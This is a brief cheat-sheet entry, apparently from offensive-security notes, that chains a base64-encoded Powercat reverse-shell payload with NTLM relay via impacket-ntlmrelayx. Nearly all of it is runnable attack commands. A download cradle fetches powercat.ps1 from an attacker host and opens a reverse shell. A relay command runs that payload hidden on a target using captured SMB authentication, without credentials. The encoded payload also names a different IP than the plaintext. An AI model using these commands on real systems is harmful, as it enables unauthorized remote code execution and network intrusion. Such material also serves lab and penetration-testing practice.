---
title: "Powercat + NTLM Relay"
---

# Powercat + NTLM Relay

Base64-encoded Powercat payload for execution via `-EncodedCommand`, combined with NTLM relay using `impacket-ntlmrelayx`. The relay captures SMB authentication on the network and executes the payload on the target without requiring credentials.

```shell
# Start HTTP server and listener
python3 -m http.server 80
rlwrap nc -vnlp 443

# Generate base64 payload in pwsh
pwsh
$Text = "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.242/powercat.ps1');powercat -c 192.168.45.242 -p 443 -e powershell"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
exit

# NTLM Relay — execute payload on target when SMB auth is captured
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.221.212 -c "powershell -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2AC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA2ACAALQBwACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA=="
```
